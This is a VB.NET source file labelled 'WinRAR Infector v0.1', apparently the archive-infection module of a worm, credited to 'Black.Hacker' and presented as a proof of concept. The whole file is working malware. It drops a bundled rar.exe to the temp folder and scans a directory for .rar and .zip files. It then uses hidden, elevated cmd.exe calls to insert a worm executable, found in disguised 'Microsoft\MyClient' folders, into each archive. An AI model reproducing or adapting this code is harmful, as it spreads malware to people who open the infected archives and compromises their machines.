﻿Imports System.Security.Principal

'------------------------------------------
' WinRAR Infector v0.1
' Coded By : Black.Hacker
' RAR and ZIP File Infector Proof Of Concept
' -----------------------------------------
Public Class ZipInfector
    Public Function Start(location As String)
        IO.File.WriteAllBytes(IO.Path.GetTempPath & "\" & "rar.exe", My.Resources.Rar)
        Dim File() As String = IO.Directory.GetFiles(location)
        For Each af As String In File
            Dim filea As New IO.FileInfo(af)
            If filea.FullName.EndsWith("rar") Or filea.FullName.EndsWith("zip") = True Then
                RunWinRAR(filea.FullName, WormPath() & "\" & GetWorm() & ".exe")
            End If
        Next
        Return "Done"
    End Function
    Public Sub RunWinRAR(rarfiles As String, ByVal myexe As String)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = "start" + " " + IO.Path.GetTempPath & "\" & "rar.exe" & "\rar.exe" + " a " & """" + rarfiles + """" + " " + """" + myexe + """"
        pi.FileName = "cmd.exe"
        pi.Verb = "runas"
        pi.UseShellExecute = True
        pi.WindowStyle = ProcessWindowStyle.Hidden
        p.StartInfo = pi
        p.Start()
    End Sub
    Public Function WormPath() As String
        Dim path As String = ""
        If IO.Directory.Exists(Environ("AppData") & "\Microsoft\MyClient") Then
            path = Environ("AppData") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("Temp") & "\Microsoft\MyClient") Then
            path = Environ("Temp") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("UserProfile") & "\Microsoft\MyClient") Then
            path = Environ("UserProfile") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("ProgramData") & "\Microsoft\MyClient") Then
            path = Environ("ProgramData") & "\Microsoft\MyClient"
        ElseIf IO.Directory.Exists(Environ("WinDir") & "\Microsoft\MyClient") Then
            path = Environ("WinDir") & "\Microsoft\MyClient"
        Else
            path = "None"
        End If
        Return path
    End Function
    Public Function GetWorm() As String
        Dim WormFile() As String = IO.Directory.GetFiles(WormPath)
        For Each file As String In WormFile
            Dim a As New IO.FileInfo(file)
            Return a.Name.Split(".")(0)
        Next
    End Function
End Class

